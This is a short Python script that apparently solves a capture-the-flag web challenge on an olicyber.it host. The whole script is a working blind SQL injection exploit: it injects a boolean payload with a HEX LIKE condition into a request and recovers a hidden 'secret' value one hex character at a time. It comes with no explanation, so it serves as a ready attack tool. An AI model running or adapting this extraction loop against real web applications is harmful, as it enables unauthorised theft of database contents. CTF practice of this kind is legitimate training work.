from sql_w.util.Inj import Inj
import binascii

inj = Inj('http://web-17.challs.olicyber.it')
dictionary = '0123456789abcdef'

result=''
while True:
    print(f"Current result: {result}")
    for c in dictionary:
        question = f"1' and (select 1 from secret where HEX(asecret) LIKE '{result+c}%')='1"
        response, error = inj.blind(question)
        if response == 'Success': # We have a match!
            result += c
            break
    else:
        break

print(f"Final result: {binascii.unhexlify(result).decode()}")
